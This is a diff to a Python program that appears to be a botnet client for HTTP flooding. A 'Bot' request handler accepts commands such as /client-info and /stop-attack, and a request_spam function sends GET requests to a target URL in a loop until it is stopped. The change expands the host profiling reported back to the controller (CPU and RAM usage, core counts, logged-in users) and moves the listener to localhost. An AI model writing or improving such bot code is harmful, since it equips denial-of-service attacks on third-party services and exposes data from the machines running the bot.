@@ -10,8 +10,8 @@ from http.server import HTTPServer, BaseHTTPRequestHandler
 import psutil
 import requests
 
-server_address = ('10.0.2.15', 15200)
-# server_address = ('localhost', 15200)
+# server_address = ('10.0.2.15', 15200)
+server_address = ('localhost', 15200)
 
 
 class Bot(BaseHTTPRequestHandler):
@@ -24,12 +24,8 @@ class Bot(BaseHTTPRequestHandler):
 
     def do_GET(self):
         if self.path == "/client-info":
-            ram, cpu = get_client_info()
             self.set_header()
-            self.wfile.write(json.dumps({
-                'ram': ram,
-                'cpu': cpu,
-            }).encode('utf-8'))
+            self.wfile.write(json.dumps(get_client_info()).encode('utf-8'))
         if self.path == "/stop-attack":
             self.event.set()
             self.set_header()
@@ -56,15 +52,21 @@ def run():
 
 
 def get_client_info():
-    cpu = platform.processor()
-    ram = psutil.virtual_memory().total / (1024.0 ** 3)
-    return ram, cpu
+    return {
+        "cpu": platform.processor(),
+        "cpu_usage": psutil.cpu_percent(),
+        "ram": round(psutil.virtual_memory().total / (1024.0 ** 3), 2),
+        "ram_usage": psutil.virtual_memory().percent,
+        "system": platform.system(),
+        "cores": psutil.cpu_count(logical=False),
+        "total_cores":  psutil.cpu_count(),
+        "users": psutil.users(),
+    }
 
 
 def request_spam(url, e):
     try:
         while not e.is_set():
-            print(e)
             res = requests.get(url)
             print(res)
     except Exception as e:
